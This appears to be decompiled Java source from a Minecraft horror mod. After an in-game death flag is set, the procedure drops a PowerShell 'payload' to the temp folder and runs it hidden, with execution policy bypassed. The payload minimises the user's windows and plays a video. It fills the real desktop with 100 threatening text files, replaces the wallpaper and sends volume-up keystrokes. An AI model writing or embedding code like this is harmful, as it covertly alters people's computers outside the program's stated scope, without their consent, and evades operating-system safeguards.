/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  javax.annotation.Nullable
 *  net.minecraft.network.chat.Component
 *  net.minecraft.world.level.LevelAccessor
 *  net.neoforged.bus.api.Event
 *  net.neoforged.bus.api.SubscribeEvent
 *  net.neoforged.fml.common.EventBusSubscriber
 *  net.neoforged.neoforge.event.tick.LevelTickEvent$Post
 */
package net.mcreator.insidethesystem.procedures;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.OpenOption;
import java.nio.file.StandardCopyOption;
import javax.annotation.Nullable;
import net.mcreator.insidethesystem.network.InsideTheSystemModVariables;
import net.minecraft.network.chat.Component;
import net.minecraft.world.level.LevelAccessor;
import net.neoforged.bus.api.Event;
import net.neoforged.bus.api.SubscribeEvent;
import net.neoforged.fml.common.EventBusSubscriber;
import net.neoforged.neoforge.event.tick.LevelTickEvent;

@EventBusSubscriber
public class WaitForMeProcedure {
    @SubscribeEvent
    public static void onWorldTick(LevelTickEvent.Post event) {
        WaitForMeProcedure.execute((Event)event, (LevelAccessor)event.getLevel());
    }

    public static void execute(LevelAccessor world) {
        WaitForMeProcedure.execute(null, world);
    }

    private static void execute(@Nullable Event event, LevelAccessor world) {
        InsideTheSystemModVariables.MapVariables mapVars = InsideTheSystemModVariables.MapVariables.get(world);
        if (mapVars.Died && !mapVars.DiedPayloadExecuted) {
            mapVars.DiedPayloadExecuted = true;
            mapVars.syncData(world);
            if (!world.isClientSide() && world.getServer() != null) {
                world.getServer().getPlayerList().broadcastSystemMessage((Component)Component.literal((String)"DIE"), false);
                System.out.println("[WaitForMeProcedure] Triggered once - Starting PowerShell Payload...");
                try {
                    String line;
                    File video = WaitForMeProcedure.exportResource("/assets/inside_the_system/Knock.mp4", "Knock.mp4");
                    File image = WaitForMeProcedure.exportResource("/assets/inside_the_system/textures/screens/story.png", "story.png");
                    String psScript = "$video = '" + video.getAbsolutePath().replace("\\", "\\\\") + "'\n$image = '" + image.getAbsolutePath().replace("\\", "\\\\") + "'\n$desktop = [Environment]::GetFolderPath('Desktop')\n(New-Object -ComObject Shell.Application).MinimizeAll()\nStart-Process $video\nfor ($i = 0; $i -lt 100; $i++) {\n  $fileName = \"I am coming for you_$($i.ToString('000')).txt\"\n  $file = \"$desktop\\$fileName\"\n  \n  # \u0412 \u043a\u0430\u0436\u0434\u044b\u0439 10-\u0439 \u0444\u0430\u0439\u043b \u0434\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u043a\u043e\u0434\n  if ($i % 10 -eq 0) {\n    $content = \"\"\n    if ($i -eq 50) {\n      $content = \"L3f3R8%tN6vX&zY4 - Violence\"\n    } else {\n      $randomCode = -join ((33..126) | Get-Random -Count 16 | % {[char]$_})\n      $content = \"$randomCode - Code $i\"\n    }\n    Set-Content -Path $file -Value $content\n  } else {\n    New-Item -Path $file -ItemType File -Force | Out-Null\n  }\n}\nAdd-Type -AssemblyName System.Drawing\n$bmpPath = \"$env:TEMP\\wallpaper.bmp\"\n$img = [System.Drawing.Image]::FromFile($image)\n$img.Save($bmpPath, [System.Drawing.Imaging.ImageFormat]::Bmp)\n$img.Dispose()\nAdd-Type @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Wallpaper {\n    [DllImport(\"user32.dll\", CharSet = CharSet.Auto)]\n    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);\n}\n\"@\n[Wallpaper]::SystemParametersInfo(20, 0, $bmpPath, 3)\n$wshell = New-Object -ComObject WScript.Shell\nfor ($i = 0; $i -lt 100; $i++) {\n    $wshell.SendKeys([char]175)\n    Start-Sleep -Milliseconds 50\n}\n";
                    File ps1 = new File(System.getProperty("java.io.tmpdir"), "payload.ps1");
                    Files.write(ps1.toPath(), psScript.getBytes(StandardCharsets.UTF_8), new OpenOption[0]);
                    System.out.println("[WaitForMeProcedure] PowerShell script saved to: " + ps1.getAbsolutePath());
                    File batFile = new File(System.getProperty("java.io.tmpdir"), "launch_payload.bat");
                    String batCommand = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + ps1.getAbsolutePath() + "\"\n";
                    Files.write(batFile.toPath(), batCommand.getBytes(StandardCharsets.UTF_8), new OpenOption[0]);
                    System.out.println("[WaitForMeProcedure] Batch file created: " + batFile.getAbsolutePath());
                    Process process = new ProcessBuilder("cmd.exe", "/c", batFile.getAbsolutePath()).redirectErrorStream(true).start();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));
                    while ((line = reader.readLine()) != null) {
                        System.out.println("[BAT OUTPUT] " + line);
                    }
                    int exitCode = process.waitFor();
                    if (exitCode != 0) {
                        System.err.println("Batch file execution failed with exit code: " + exitCode);
                    } else {
                        System.out.println("Batch file executed successfully.");
                    }
                }
                catch (Exception e) {
                    e.printStackTrace();
                    System.err.println("[WaitForMeProcedure] Error executing payload.");
                }
            }
        }
    }

    public static File exportResource(String resourcePath, String outputName) throws IOException {
        InputStream stream = WaitForMeProcedure.class.getResourceAsStream(resourcePath);
        if (stream == null) {
            throw new FileNotFoundException("Resource not found: " + resourcePath);
        }
        File tempFile = new File(System.getProperty("java.io.tmpdir"), outputName);
        Files.copy(stream, tempFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
        System.out.println("[WaitForMeProcedure] Exported resource: " + tempFile.getAbsolutePath());
        return tempFile;
    }
}

